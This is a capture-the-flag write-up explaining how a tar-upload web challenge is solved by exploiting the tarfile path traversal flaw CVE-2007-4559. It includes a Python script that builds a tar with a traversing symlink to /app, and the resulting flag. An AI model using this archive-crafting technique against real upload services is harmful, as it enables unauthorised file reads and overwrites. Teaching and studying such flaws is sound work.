
# Web/File Sharing Portal
**Writeup Author:**  taodragon_
**Original Solver:** taodragon_
**Point Value:** 478

**Provided Files:**
  - `chall.zip`

**Description:**
Welcome to the file sharing portal! We only support tar files! Author: NoobMaster + NoobHacker

# Solution

The flag is stored on the server att `/app/`REDACTED`.txt` with the filename redacted. Luckily, there is a route that allows us to see and read files in a directory.
```
@app.route('/view/<name>')
def view(name):
    if not all([i in "abcdef1234567890" for i in name]):
        return render_template_string("<p>Error!</p>")
        #print(os.popen(f'ls ./uploads/{name}').read())
            #print(name)
    files = os.listdir(f"./uploads/{name}")
    out = '<h1>Files</h1><br>'
    files.remove(f'{name}.tar')  # Remove the tar file from the list
    for i in files:
        out += f'<a href="/read/{name}/{i}">{i}</a>'
       # except:
    return render_template_string(out)
```
To use this to view the /app/ directory, we need to use two vulnerabilities.
Firstly, we can include symbolic links in tar files, and they will work after you untar the file.
This means that we can read `/etc/passwd` by including a symlink to it in the tar. However, we don't know the name of the file that the flag is in.
Secondly, we can overwrite files not in the directory with the python `tarfile` package.
We do this by exploiting [CVE-2007-4559](https://nvd.nist.gov/vuln/detail/CVE-2007-4559), which is a vulnerability in the `tarfile` package `extractall` method where attackers can overwrite arbitrary files by including `..` in the filename.

## CVE-2007-4559

We can see what causes this vulnerability by looking at the [source code for the tarfile package.](https://github.com/python/cpython/blob/3.12/Lib/tarfile.py)
```
class TarFile(object):
  ...
  def _get_filter_function(self, filter):
    if filter is None:
      filter = self.extraction_filter
        if filter is None:
          warnings.warn(
            'Python 3.14 will, by default, filter extracted tar '
            + 'archives and reject files or modify their metadata. '
            + 'Use the filter argument to control this behavior.',
            DeprecationWarning, stacklevel=3)
          return fully_trusted_filter
          ...
  def extractall(self, path=".", members=None, *, numeric_owner=False, filter=None):
    ...
    filter_function = self._get_filter_function(filter) 
    ...
    for member in members:
      tarinfo = self._get_extract_tarinfo(member, filter_function, path)
      if tarinfo is None:
        continue
      if tarinfo.isdir():
        directories.append(tarinfo)
      self._extract_one(tarinfo, path, set_attrs=not tarinfo.isdir(), numeric_owner=numeric_owner)
    ...
    for tarinfo in directories:
      dirpath = os.path.join(path, tarinfo.name)
    ...
  def _get_extract_tarinfo(self, member, filter_function, path):
    ...
    unfiltered = tarinfo
    try:
      tarinfo = filter_function(tarinfo, path)
      ...
```
These are the relevant parts of the source code. One part that should stand out is `dirpath = os.path.join(path, tarinfo.name)`. If `tarinfo.name` is not sanitized, then this will overwrite arbitrary files. We can see however, that `tarinfo` is filtered by `tarinfo = filter_function(tarinfo, path)`. In the `extractall` function, the `filter_function` function is the output of `self._get_filter_function(filter)`, where `filter` is a parameter of `extractall`. The default value of this is `None`. The code that deals with this case is shown below:
```
class TarFile(object):
  ...
  def _get_filter_function(self, filter):
    if filter is None:
      filter = self.extraction_filter
        if filter is None:
          warnings.warn(
            'Python 3.14 will, by default, filter extracted tar '
            + 'archives and reject files or modify their metadata. '
            + 'Use the filter argument to control this behavior.',
            DeprecationWarning, stacklevel=3)
          return fully_trusted_filter
          ...
```
If there is no `filter` and the `TarFile` object has no `extraction_filter`, the `filter_function` will be `fully_trusted_filter`, which is clearly bad for security. There is even a `DeprecationWarning` that in Python 3.14 this functionality will be changed.
Because there is no filtering on the name of the file, an attacker could craft a name to overwrite arbitrary files.

## The Attack

We will create `exploit.tar` that contains the following files:
- `file`, a regular file with regular contents
- `/app/uploads/abc123`, a symlink to `/app`
- `/app/abc123.tar`, a regular file with regular contents

Note that the paths are the names of each of the files, but the package `tarfile` will incorrectly parse them with `os.path.join`, which leads to the path traversal previously mentioned.
The reasons for each file are as such.

`file`:
This is to test if the tar file was successfully extracted. This can contain anything as long as its a regular readable file.
`/app/uploads/abc123`:
The program will incorrectly place this symlink at `/app/uploads/abc123`, which means that it will be accessible at `/view/abc123` on the website. Note that the name `abc123` was chosen because it passes the hexadecimal filter imposed separately.
`/app/abc123.tar`:
When we visit `/view/abc123`, the program will attempt to execute `files.remove(f'{name}.tar')` where files is a list of filenames. In this case, if `abc123.tar` is not in `/app/uploads/abc123` which is a symlink to `/app`, the program will fail and we will not be able to read any files.

We will generate the file in a linux system like so: 
1. Create a directory for the exploit
2. Create a regular file called `file` containing regular file contents that are regular
3. Create a symlink called `rename` that links to `/app/`
4. Run the following python code to create `exploit.tar`
```
import tarfile

def change_name(tarinfo):
    tarinfo.name = "/app/uploads/abc123"
    return tarinfo
def change_name2(tarinfo):
    tarinfo.name = "/app/abc123.tar"
    return tarinfo

with tarfile.open('exploit.tar', 'w') as tar:
    tar.add('./file')
    tar.add('./rename', filter=change_name)
    tar.add('./file', filter=change_name2)
```
We use the filter parameter which allowed us to do this to rename our files to paths.

Script: `sol.py`
Flag: `n00bz{n3v3r_7rus71ng_t4r_4g41n!_82d86c570fb1}`
